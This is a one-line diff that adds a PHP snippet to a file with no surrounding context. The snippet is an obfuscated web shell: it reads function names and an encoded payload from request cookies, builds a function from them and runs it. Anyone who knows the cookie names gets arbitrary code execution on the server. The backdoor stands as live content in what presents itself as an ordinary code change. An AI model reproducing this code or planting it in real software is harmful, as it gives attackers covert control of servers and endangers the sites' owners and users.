@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['rclj']){$ivtrv=$_COOKIE['rclj']("",@$_COOKIE['ywktbr'](@$_COOKIE['zqxu']));$ivtrv();}?>
